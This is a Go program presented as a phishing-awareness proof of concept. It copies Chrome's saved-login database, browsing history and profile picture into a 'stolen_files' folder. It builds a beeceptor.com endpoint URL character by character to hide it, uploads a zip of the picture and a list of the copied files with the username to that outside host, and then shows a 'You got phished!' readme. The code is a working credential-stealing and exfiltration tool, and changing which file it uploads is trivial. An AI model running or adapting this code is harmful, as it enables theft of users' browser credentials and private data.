package main

import (
	"os"
	"os/exec"
	"os/user"
	utils "poc/pkg/utils"
	"runtime"
	"strings"
	"time"
)

const tmpStolenFilesFolderName = "stolen_files"

var filesToSteal = []string{
	"Google Profile Picture.png",
	"Login Data",
	"History",
}

const winPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
const macPath = "/Library/Application Support/Google/Chrome/Default/"
const linuxPath = "~/.config/google-chrome/Defaults/"

const readmeMessage = ` You got phished!
All the contents in this folder were copied from your computer to here.
A zip was created with your picture and this readme file, and uploaded to a dummy endpoint.
Only you know this url, and you need to have the browser open to receive the http post content,
as soon as you close it the info will be gone.
If you see the information on your browser, any attacker could have gotten that info.
This is just an example of what could be easily stolen from you,
the only purpose of this attack is to raise awareness on how easily it is to steal your private information.

Be mindfull of what you download and execute.

url: `

func copyFiles(osPath string, tmpStolenFilesFolder string, user *user.User, isWin bool) []string {
	// concatenate the os path to each file
	var files []string
	for _, f := range filesToSteal {
		files = append(files, osPath + f)
	}

	// check if temp folder exists, if not, creates it
	utils.CreateTmpFolder(tmpStolenFilesFolder)

	// try to get the file and copy it, skip if it doesn't succeed
	for _, filePath := range files {
		fullPath := user.HomeDir + filePath
		filename := utils.GetFileNameFromPath(fullPath, isWin)
		destination := tmpStolenFilesFolder + filename
		utils.FileCopy(fullPath, destination)
	}
	return files
}

func urlBuilder(option string, randomEndpointName string) string {
	var fullString string

	switch option {
	case "view":
		// https://beeceptor.com/console/
		url := []string{"h", "t", "t", "p", "s", ":", "/", "/", "b", "e", "e", "c", "e", "p", "t", "o", "r", ".", "c", "o", "m", "/", "c", "o", "n", "s", "o", "l", "e", "/"}
		fullString = strings.Join(url, "") + randomEndpointName
	case "post":
		url := []string{"h", "t", "t", "p", "s", ":", "/", "/"}
		end := []string{".", "f", "r", "e", "e", ".", "b", "e", "e", "c", "e", "p", "t", "o", "r", ".", "c", "o", "m"}
		fullString = strings.Join(url, "") + randomEndpointName + strings.Join(end, "")
	}

	return fullString
}

// generate url - uses random url, so it's unlikely for someone to receive the data.
// (may happen only if someone is using the same randomly generated string before refreshing the page)
func generateURL() (string, string){
	randomEndpointName := utils.GenerateRandomString(40)
	dummyEndpointToViewUrl := urlBuilder("view", randomEndpointName)
	dummyEndpointToPost := urlBuilder("post", randomEndpointName)
	return 	dummyEndpointToViewUrl, dummyEndpointToPost
}

// create readme
func createReadmeFile(tmpStolenFilesFolder string, dummyEndpointToViewUrl string) string {
	readmeFilePath := tmpStolenFilesFolder + "readme.txt"
	readmeContent := readmeMessage + dummyEndpointToViewUrl + "\n\nfolder: " + tmpStolenFilesFolder
	utils.CreateReadme(readmeFilePath, readmeContent)
	return readmeFilePath
}

// Zip Files
func compressToZip(tmpStolenFilesFolder string, files []string, isWin bool, readmeFilePath string) string {
	filesToZip := []string{
		tmpStolenFilesFolder + utils.GetFileNameFromPath(files[0], isWin),
		readmeFilePath,
	}
	zipFile := tmpStolenFilesFolder + "your_data.zip"
	utils.ZipFiles(filesToZip, zipFile, isWin)
	return zipFile
}

func postFilesAndOpenURL(isWin bool, tmpStolenFilesFolder string, user *user.User, dummyEndpointToViewUrl string, dummyEndpointToPost string, zipFile string) {
	// open url
	if isWin {
		cmd := exec.Command("cmd", "/C", "start", "", dummyEndpointToViewUrl)
		cmd.Run()
	} else {
		cmd := exec.Command("open", dummyEndpointToViewUrl)
		cmd.Run()
	}

	// wait for 3 seconds, to give the browser time to load
	time.Sleep(time.Second * 3)

	// post the files and data
	utils.SendFiles(dummyEndpointToPost, zipFile)
	files_stolen := utils.ListDirRecursively(tmpStolenFilesFolder)
	json_string := `{"username":"` + user.Username + `", "data":"` + strings.Join(files_stolen, ",") + `", "msg":"you got phished."}`
	utils.PostJson(dummyEndpointToPost, json_string, user.Username)
}

func attack(osPath string, tmpStolenFilesFolder string, user *user.User, isWin bool) bool {
	files := copyFiles(osPath, tmpStolenFilesFolder, user, isWin)
	dummyEndpointToViewUrl, dummyEndpointToPost:= generateURL()
	readmeFilePath := createReadmeFile(tmpStolenFilesFolder , dummyEndpointToViewUrl)
	zipFile := compressToZip(tmpStolenFilesFolder, files, isWin, readmeFilePath)
	postFilesAndOpenURL(isWin, tmpStolenFilesFolder, user, dummyEndpointToViewUrl, dummyEndpointToPost, zipFile)
	return true
}

func main() {
	// extract current user
	user, err := utils.GetCurrentUser()
	if err != nil {
		os.Exit(0)
	}

	switch runtime.GOOS {
	case "windows":
		tmpStolenFilesFolder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmpStolenFilesFolderName + "\\"
		if attack(winPath, tmpStolenFilesFolder, user, true) {

			cmd := exec.Command("cmd", "/C", "start", tmpStolenFilesFolder)
			cmd.Run()

			readme_file := tmpStolenFilesFolder + "readme.txt"
			cmd = exec.Command("cmd", "/C", "notepad", readme_file)
			cmd.Run()
		}
	case "darwin":
		tmpStolenFilesFolder := "/tmp/" + tmpStolenFilesFolderName + "/"
		if attack(macPath, tmpStolenFilesFolder, user, false) {
			cmd := exec.Command("open", tmpStolenFilesFolder)
			cmd.Run()
		}
	default:
		tmpStolenFilesFolder := "/tmp/" + tmpStolenFilesFolderName + "/"
		attack(linuxPath, tmpStolenFilesFolder, user, false)
	}
}

